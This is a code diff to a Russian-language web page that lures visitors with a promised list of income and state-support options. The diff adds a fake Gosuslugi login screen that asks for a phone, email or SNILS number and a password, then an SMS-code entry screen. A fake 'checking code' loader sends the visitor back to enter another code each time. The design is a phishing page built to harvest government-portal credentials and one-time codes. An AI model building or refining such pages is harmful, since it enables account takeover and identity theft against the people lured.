@@ -9,7 +9,7 @@
     .container { max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); display: none; box-sizing: border-box; }
     h1 { font-size: 20px; margin-bottom: 10px; }
     p { margin-bottom: 20px; }
-    button, select, input[type="text"] {
+    button, select, input[type="text"], input[type="password"] {
       width: 100%;
       padding: 15px;
       font-size: 16px;
@@ -23,10 +23,22 @@
     .green { background: #22c55e; color: white; }
     .gray { background: #e5e7eb; color: #111827; }
     .gray.active { background: #22c55e; color: white; }
-    input[type="text"] { border: 1px solid #d1d5db; }
+    input[type="text"], input[type="password"] { border: 1px solid #d1d5db; }
     .note { font-size: 14px; color: #6b7280; }
     ul { padding-left: 20px; margin-top: 10px; }
     li { margin-bottom: 6px; }
+    .loader {
+      border: 4px solid #e5e7eb;
+      border-top: 4px solid #2563eb;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -60,7 +72,7 @@
   <div class="container" id="screen5">
     <h1>🎯 Подборка доступных способов дохода готова</h1>
     <p>Мы учли ваш статус и уровень дохода. Чтобы получить персональный доступ — подтвердите личность через Госуслуги.</p>
-    <button class="blue">🔐 Войти через Госуслуги</button>
+    <button class="blue" onclick="nextScreen(6)">🔐 Войти через Госуслуги</button>
     <div class="note">
       <p>Зачем это нужно:</p>
       <ul style="list-style: none; padding-left: 0;">
@@ -68,6 +80,63 @@
         <li>✔ Подбираем точные меры поддержки</li>
         <li>✔ Учитываем возраст, регион и подтверждённый статус</li>
       </ul>
+    </div>
+  </div>
+
+  <!-- Новый экран Госуслуги в общем стиле -->
+  <div class="container" id="screen6">
+    <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
+      <span style="color:#2563eb;">Гос</span><span style="color:#ef4444;">услуги</span>
+    </h1>
+    <div style="margin-bottom: 16px;">
+      <input type="text" class="input" placeholder="Телефон / Email / СНИЛС" style="margin-bottom: 12px;" />
+      <input type="password" class="input" placeholder="Пароль" style="margin-bottom: 8px;" />
+      <div style="margin-bottom: 20px; text-align:right;">
+        <span style="color:#2563eb; cursor:pointer; font-size:15px;">Восстановить</span>
+      </div>
+      <button class="blue" onclick="nextScreen(7)">Войти</button>
+      <div style="margin-top: 10px; text-align:center;">
+        <span style="color:#2563eb; cursor:pointer; font-size:15px;">Зарегистрироваться</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Новый экран подтверждения входа по СМС -->
+  <div class="container" id="screen7">
+    <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
+      <span style="color:#2563eb;">гос</span><span style="color:#ef4444;">услуги</span>
+    </h1>
+    <div style="margin-bottom: 18px; text-align:center;">
+      <div style="font-size: 18px; margin-bottom: 8px;">Подтвердите вход по СМС</div>
+      <div style="font-size: 15px; color: #6b7280; margin-bottom: 18px;">Код подтверждения отправлен на телефон</div>
+      <div id="code-inputs" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 18px;">
+        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+        <input type="text" maxlength="1" class="code-box" style="width: 38px; height: 48px; text-align: center; font-size: 24px; border: 1px solid #d1d5db; border-radius: 8px; background: #f3f4f6;" />
+      </div>
+      <div style="font-size: 15px; color: #2563eb; margin-bottom: 18px;">
+        Отправить повторно через <span id="sms-timer">60</span> секунд
+      </div>
+      <div style="margin-bottom: 8px;">
+        <span style="color:#2563eb; cursor:pointer; font-size:15px;">Не могу подтвердить вход</span>
+      </div>
+      <div style="font-size: 13px; color: #6b7280;">
+        Если вам не поступают СМС, проверьте правильность введённых данных
+      </div>
+    </div>
+  </div>
+
+  <!-- Экран загрузки после ввода кода -->
+  <div class="container" id="screen8">
+    <h1 style="text-align:center; font-size: 2em; margin-bottom: 24px;">
+      <span style="color:#2563eb;">гос</span><span style="color:#ef4444;">услуги</span>
+    </h1>
+    <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 180px;">
+      <div class="loader" style="margin-bottom: 18px;"></div>
+      <div style="font-size: 18px; color: #2563eb;">Проверяем код...</div>
     </div>
   </div>
 
@@ -82,6 +151,10 @@
         const raw = document.getElementById('income').value.replace(/\D/g, '');
         const formattedIncome = new Intl.NumberFormat('ru-RU').format(raw);
         document.getElementById('confirmation').textContent = `Вы выбрали: ${userStatus}, доход: ${formattedIncome} ₽/мес`;
+      }
+      if (screenNumber === 7) {
+        startSMSTimer();
+        setupCodeInputs();
       }
     }
 
@@ -102,6 +175,53 @@
         btn.disabled = true;
         btn.classList.remove('active');
       }
+    }
+
+    function startSMSTimer() {
+      let timer = 60;
+      const timerSpan = document.getElementById('sms-timer');
+      if (!timerSpan) return;
+      timerSpan.textContent = timer;
+      const interval = setInterval(() => {
+        timer--;
+        timerSpan.textContent = timer;
+        if (timer <= 0) {
+          clearInterval(interval);
+          timerSpan.textContent = '0';
+        }
+      }, 1000);
+    }
+
+    // Логика для ввода кода подтверждения
+    function setupCodeInputs() {
+      const inputs = document.querySelectorAll('#code-inputs .code-box');
+      inputs.forEach((input, idx) => {
+        input.value = '';
+        input.oninput = function(e) {
+          this.value = this.value.replace(/[^0-9]/g, '');
+          if (this.value && idx < inputs.length - 1) {
+            inputs[idx + 1].focus();
+          }
+          // Если все поля заполнены
+          if ([...inputs].every(inp => inp.value.length === 1)) {
+            setTimeout(() => {
+              nextScreen(8);
+              setTimeout(() => {
+                // Очистить поля и вернуть на ввод кода
+                inputs.forEach(inp => inp.value = '');
+                nextScreen(7);
+              }, 2000);
+            }, 200);
+          }
+        };
+        input.onkeydown = function(e) {
+          if (e.key === 'Backspace' && !this.value && idx > 0) {
+            inputs[idx - 1].focus();
+          }
+        };
+      });
+      // Фокус на первое поле
+      if (inputs.length) inputs[0].focus();
     }
   </script>
 </body>
